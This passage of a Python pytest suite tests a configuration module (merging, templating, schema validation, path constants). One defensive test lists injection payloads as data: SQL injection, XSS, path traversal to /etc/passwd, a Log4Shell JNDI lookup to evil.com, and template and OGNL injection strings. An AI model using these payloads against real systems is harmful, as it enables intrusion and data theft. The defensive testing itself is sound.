                'setting2': 'base_value2'
            }
        }
        
        override_config = {
            'api_key': 'override_key',
            'timeout': 60,
            'new_setting': 'new_value',
            'nested': {
                'setting2': 'override_value2',
                'setting3': 'new_value3'
            }
        }
        
        # Test if Config supports merging
        try:
            if hasattr(Config, 'merge'):
                merged_config = Config.merge(base_config, override_config)
                assert merged_config is not None
            elif hasattr(Config, 'from_multiple'):
                merged_config = Config.from_multiple([base_config, override_config])
                assert merged_config is not None
            else:
                # Test manual merge approach
                merged_data = {**base_config, **override_config}
                merged_config = Config(merged_data)
                assert merged_config is not None
        except (AttributeError, TypeError, ConfigError):
            # Merging might not be supported
            pass

    def test_config_inheritance_patterns(self):
        """Test configuration inheritance from parent configurations."""
        if not Config:
            pytest.skip("Config class not available")
        
        parent_configs = [
            {'api_key': 'parent1_key', 'timeout': 30},
            {'base_url': 'https://parent2.example.com', 'debug': True},
            {'max_retries': 5, 'character_settings': {'default_name': 'Parent'}}
        ]
        
        child_config = {
            'api_key': 'child_key',
            'new_setting': 'child_value'
        }
        
        # Test if Config supports inheritance
        try:
            if hasattr(Config, 'inherit'):
                inherited_config = Config.inherit(parent_configs, child_config)
                assert inherited_config is not None
            else:
                # Test creating config with merged data
                merged_data = {}
                for parent in parent_configs:
                    merged_data.update(parent)
                merged_data.update(child_config)
                
                inherited_config = Config(merged_data)
                assert inherited_config is not None
        except (AttributeError, TypeError, ConfigError):
            # Inheritance might not be supported
            pass


class TestConfigWatching:
    """Tests for configuration file watching and hot-reload functionality."""
    
    def test_config_file_change_detection(self):
        """Test detection of configuration file changes."""
        if not load_config:
            pytest.skip("load_config function not available")
        
        config_data = {'api_key': 'initial_key', 'base_url': 'https://api.example.com'}
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(config_data, f)
            temp_path = f.name
        
        try:
            # Load initial config
            initial_config = load_config(temp_path)
            assert initial_config.get('api_key') == 'initial_key'
            
            # Modify the file
            import time
            time.sleep(0.1)  # Ensure timestamp difference
            
            updated_data = {'api_key': 'updated_key', 'base_url': 'https://api.example.com'}
            with open(temp_path, 'w') as f:
                json.dump(updated_data, f)
            
            # Check if reloading detects changes
            updated_config = load_config(temp_path)
            assert updated_config.get('api_key') == 'updated_key'
            
            # Test if Config supports file watching
            if hasattr(Config, 'watch_file') or hasattr(Config, 'auto_reload'):
                # Test watching functionality if available
                pass
                
        finally:
            os.unlink(temp_path)

    def test_config_hot_reload_callback(self):
        """Test configuration hot-reload with callback functionality."""
        if not Config:
            pytest.skip("Config class not available")
        
        callback_called = []
        
        def config_change_callback(old_config, new_config):
            callback_called.append((old_config, new_config))
        
        config_data = {'api_key': 'callback_test_key', 'base_url': 'https://api.example.com'}
        config = Config(config_data)
        
        # Test if Config supports change callbacks
        try:
            if hasattr(config, 'on_change'):
                config.on_change(config_change_callback)
            elif hasattr(config, 'add_listener'):
                config.add_listener(config_change_callback)
        except (AttributeError, TypeError):
            # Callback functionality might not be supported
            pass


class TestConfigSchema:
    """Tests for configuration schema validation and definition."""
    
    def test_config_schema_validation(self):
        """Test configuration against predefined schemas."""
        if not validate_config:
            pytest.skip("validate_config function not available")
        
        # Test with schema-like validation if supported
        schema_configs = [
            {
                'api_key': {'type': 'string', 'required': True, 'min_length': 8},
                'timeout': {'type': 'integer', 'minimum': 1, 'maximum': 300},
                'debug': {'type': 'boolean', 'default': False}
            }
        ]
        
        valid_data = {
            'api_key': 'valid_key_123',
            'timeout': 30,
            'debug': True
        }
        
        invalid_data = {
            'api_key': 'short',  # Too short
            'timeout': -1,       # Below minimum
            'debug': 'not_bool'  # Wrong type
        }
        
        try:
            # Test if validate_config supports schema validation
            result = validate_config(valid_data)
            assert result is not False
            
            with pytest.raises((ValueError, ConfigError)):
                validate_config(invalid_data)
        except (TypeError, AttributeError):
            # Schema validation might not be supported
            pass

    def test_config_with_custom_validators(self):
        """Test configuration with custom validation functions."""
        if not (Config or validate_config):
            pytest.skip("Config class or validate_config function not available")
        
        def custom_api_key_validator(value):
            return isinstance(value, str) and len(value) >= 10 and value.startswith('test_')
        
        def custom_url_validator(value):
            return isinstance(value, str) and value.startswith('https://')
        
        custom_validators = {
            'api_key': custom_api_key_validator,
            'base_url': custom_url_validator
        }
        
        valid_config = {
            'api_key': 'test_valid_api_key',
            'base_url': 'https://valid.example.com'
        }
        
        invalid_config = {
            'api_key': 'invalid_key',
            'base_url': 'http://insecure.example.com'
        }
        
        # Test if custom validators are supported
        try:
            if hasattr(Config, 'set_validators'):
                Config.set_validators(custom_validators)
                config = Config(valid_config)
                assert config is not None
                
                with pytest.raises((ValueError, ConfigError)):
                    Config(invalid_config)
        except (AttributeError, TypeError):
            # Custom validators might not be supported
            pass


class TestConfigComplex:
    """Complex integration tests combining multiple configuration features."""
    
    def test_config_multi_environment_setup(self):
        """Test configuration in multi-environment setup with overrides."""
        if not (Config and load_config):
            pytest.skip("Config class or load_config function not available")
        
        # Create base config
        base_config = {
            'api_key': 'base_key',
            'base_url': 'https://api.example.com',
            'timeout': 30,
            'debug': False
        }
        
        # Create environment-specific configs
        dev_config = {
            'api_key': 'dev_key',
            'debug': True,
            'timeout': 60
        }
        
        prod_config = {
            'api_key': 'prod_key',
            'debug': False,
            'timeout': 10
        }
        
        env_configs = {'development': dev_config, 'production': prod_config}
        
        for env_name, env_config in env_configs.items():
            with patch.dict(os.environ, {'ENVIRONMENT': env_name}):
                # Test environment-aware configuration loading
                merged_config = {**base_config, **env_config}
                config = Config(merged_config)
                assert config is not None

    def test_config_with_templating(self):
        """Test configuration with template-like variable substitution."""
        if not Config:
            pytest.skip("Config class not available")
        
        template_config = {
            'api_key': 'template_key',
            'base_url': 'https://{environment}.api.example.com',
            'timeout': '{default_timeout}',
            'debug': '{debug_flag}',
            'database_url': 'postgres://{db_user}:{db_pass}@{db_host}:{db_port}/{db_name}'
        }
        
        template_vars = {
            'environment': 'staging',
            'default_timeout': '45',
            'debug_flag': 'true',
            'db_user': 'testuser',
            'db_pass': 'testpass',
            'db_host': 'localhost',
            'db_port': '5432',
            'db_name': 'testdb'
        }
        
        # Test if Config supports template substitution
        try:
            if hasattr(Config, 'from_template'):
                config = Config.from_template(template_config, template_vars)
                assert config is not None
            else:
                # Manual template substitution for testing
                resolved_config = {}
                for key, value in template_config.items():
                    if isinstance(value, str):
                        resolved_value = value
                        for var_name, var_value in template_vars.items():
                            resolved_value = resolved_value.replace(f'{{{var_name}}}', str(var_value))
                        resolved_config[key] = resolved_value
                    else:
                        resolved_config[key] = value
                
                config = Config(resolved_config)
                assert config is not None
        except (AttributeError, TypeError, ConfigError):
            # Template functionality might not be supported
            pass

    def test_config_plugin_system(self):
        """Test configuration with plugin-like extensibility."""
        if not Config:
            pytest.skip("Config class not available")
        
        # Test if Config supports plugins or extensions
        try:
            base_config = {
                'api_key': 'plugin_test_key',
                'base_url': 'https://api.example.com'
            }
            
            if hasattr(Config, 'register_plugin'):
                # Test plugin registration if supported
                def sample_plugin(config):
                    return {**config, 'plugin_added': True}
                
                Config.register_plugin('sample', sample_plugin)
                config = Config(base_config)
                assert config is not None
            elif hasattr(Config, 'extend'):
                # Test extension mechanism if supported
                extension = {'extended_feature': True}
                config = Config(base_config)
                extended_config = config.extend(extension)
                assert extended_config is not None
        except (AttributeError, TypeError):
            # Plugin system might not be supported
            pass


# Additional parametrized tests for comprehensive edge case coverage
@pytest.mark.parametrize("malicious_input", [
    "'; DROP TABLE configs; --",
    "<script>alert('xss')</script>",
    "../../../etc/passwd",
    "\x00\x01\x02\x03",
    "\\u0000\\u0001",
    "${jndi:ldap://evil.com/}",
    "{{7*7}}",
    "%{(#_='multipart/form-data')}"
])
def test_config_security_against_injection(malicious_input):
    """Test configuration security against various injection attacks."""
    if not Config:
        pytest.skip("Config class not available")
    
    malicious_config = {
        'api_key': malicious_input,
        'base_url': f'https://{malicious_input}.example.com',
        'description': f'Config with {malicious_input} content'
    }
    
    try:
        config = Config(malicious_config)
        assert config is not None
        
        # Ensure malicious content doesn't get executed or cause issues
        config_str = str(config)
        assert config_str is not None
    except (ValueError, ConfigError):
        # Some malicious inputs should be rejected
        pass


@pytest.mark.parametrize("file_size", [0, 1, 100, 1024, 10240, 102400])
def test_config_loading_different_file_sizes(file_size):
    """Test configuration loading with files of different sizes."""
    if not load_config:
        pytest.skip("load_config function not available")
    
    # Create config data that will result in approximately the target file size
    if file_size == 0:
        config_data = {}
    else:
        # Calculate approximate content needed for target size
        base_config = {'api_key': 'size_test_key', 'base_url': 'https://api.example.com'}
        padding_size = max(0, file_size - len(json.dumps(base_config)))
        config_data = {**base_config, 'padding': 'x' * padding_size}
    
    with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
        json.dump(config_data, f)
        temp_path = f.name
    
    try:
        actual_size = os.path.getsize(temp_path)
        
        if actual_size == 0:
            # Empty files should either load as empty config or raise error
            try:
                config = load_config(temp_path)
                assert config is not None
            except (ConfigError, json.JSONDecodeError):
                pass
        else:
            config = load_config(temp_path)
            assert config is not None
    except (MemoryError, ConfigError):
        # Very large files might be rejected
        if file_size > 50000:  # Allow rejection of very large files
            pass
        else:
            raise
    finally:
        os.unlink(temp_path)


@pytest.mark.parametrize("nesting_depth", [1, 5, 10, 20, 50])
def test_config_with_varying_nesting_depths(nesting_depth):
    """Test configuration with varying levels of nesting depth."""
    if not Config:
        pytest.skip("Config class not available")
    
    # Create deeply nested configuration
    nested_config = {'api_key': 'nesting_test_key'}
    current_level = nested_config
    
    for i in range(nesting_depth):
        current_level[f'level_{i}'] = {}
        current_level = current_level[f'level_{i}']
    
    current_level['deep_value'] = f'found_at_depth_{nesting_depth}'
    
    try:
        config = Config(nested_config)
        assert config is not None
    except (RecursionError, ConfigError):
        # Very deep nesting might be rejected
        if nesting_depth > 30:  # Allow rejection of extremely deep nesting
            pass
        else:
            raise


# Tests for the actual config.py module functionality
class TestActualConfigModule:
    """Tests for the actual config.py module functionality."""
    
    def setup_method(self):
        """Set up test fixtures."""
        # Import the actual config module
        try:
            import CharacterClient.src.config as actual_config
            self.config_module = actual_config
        except ImportError:
            try:
                import CharacterClient.config as actual_config
                self.config_module = actual_config
            except ImportError:
                self.config_module = None

    def test_config_module_path_constants(self):
        """Test that the config module defines expected path constants."""
        if not self.config_module:
            pytest.skip("Config module not available")
        
        expected_constants = [
            'CLIENT_ROOT',
            'CLIENT_DATA_PATH',
            'CLIENT_MODELS_PATH',
            'CLIENT_LLM_MODELS_PATH',
            'CLIENT_TTS_MODELS_PATH',
            'CLIENT_LOGS_PATH',
            'CLIENT_TEMP_AUDIO_PATH'
        ]
        
        for constant in expected_constants:
            assert hasattr(self.config_module, constant), f"Missing constant: {constant}"
            value = getattr(self.config_module, constant)
            assert isinstance(value, str), f"Constant {constant} should be a string"
            assert len(value) > 0, f"Constant {constant} should not be empty"

    def test_config_directory_creation_function(self):
        """Test the ensure_client_directories function."""
        if not self.config_module:
            pytest.skip("Config module not available")
        
        if hasattr(self.config_module, 'ensure_client_directories'):
            # Test that the function exists and is callable
            func = getattr(self.config_module, 'ensure_client_directories')
            assert callable(func), "ensure_client_directories should be callable"
            
            # Test calling the function (it should not raise exceptions)
            try:
                func()
            except Exception as e:
                pytest.fail(f"ensure_client_directories raised an exception: {e}")

    def test_config_environment_variable_support(self):
        """Test that config respects environment variables."""
        if not self.config_module:
            pytest.skip("Config module not available")
        
        with patch.dict(os.environ, {
            'DREAMWEAVER_CLIENT_DATA_PATH': '/custom/data/path',
            'DREAMWEAVER_CLIENT_MODELS_PATH': '/custom/models/path'
        }):
            # Reload the module to pick up environment changes
            import importlib
            importlib.reload(self.config_module)
            
            # Check that environment variables are respected
            if hasattr(self.config_module, 'CLIENT_DATA_PATH'):
                assert self.config_module.CLIENT_DATA_PATH == '/custom/data/path'
            
            if hasattr(self.config_module, 'CLIENT_MODELS_PATH'):
                assert self.config_module.CLIENT_MODELS_PATH == '/custom/models/path'

    def test_config_path_relationships(self):
        """Test that config paths have correct relationships."""
        if not self.config_module:
            pytest.skip("Config module not available")
        
        # Test that specialized paths are subdirectories of general paths
        if hasattr(self.config_module, 'CLIENT_DATA_PATH') and hasattr(self.config_module, 'CLIENT_MODELS_PATH'):
            data_path = self.config_module.CLIENT_DATA_PATH
            models_path = self.config_module.CLIENT_MODELS_PATH
            
            # Models path should be under data path (unless overridden by env var)
            if not os.environ.get('DREAMWEAVER_CLIENT_MODELS_PATH'):
                assert models_path.startswith(data_path), "Models path should be under data path"

    @patch('os.makedirs')
    def test_config_directory_creation_calls(self, mock_makedirs):
        """Test that directory creation is called for all required paths."""
        if not self.config_module:
            pytest.skip("Config module not available")
        
        if hasattr(self.config_module, 'ensure_client_directories'):
            # Reset the mock
            mock_makedirs.reset_mock()
            
            # Call the function
            self.config_module.ensure_client_directories()
            
            # Verify that makedirs was called
            assert mock_makedirs.called, "os.makedirs should be called"
            
            # Check that exist_ok=True is used
            for call in mock_makedirs.call_args_list:
                args, kwargs = call
                assert kwargs.get('exist_ok', False) is True, "Should use exist_ok=True"
